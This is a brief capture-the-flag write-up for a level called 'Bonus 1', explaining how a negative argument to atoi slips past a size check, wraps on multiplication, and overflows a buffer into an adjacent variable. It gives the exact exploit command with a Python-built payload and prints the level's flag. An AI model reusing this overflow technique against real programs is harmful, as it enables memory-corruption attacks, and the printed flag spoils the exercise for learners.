# Bonus 1

The program use atoi on a number, checks if it is under 10 THEN multiplies it by 4 and we would like it to be 44 characters so we can overflow from the str buffer into the n variable and write what we need in there. So we find a number that is under 10 and that, when multiplied by 4 is over 44 with our little test program.

`./a.out -2147483637`
`44`

And now we just write after str direcrly in n the thing we need to write in there.

`./bonus1  -2147483637 $(python -c 'print "N" * 40 + "\x46\x4c\x4f\x57"')`

**Flag:** `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
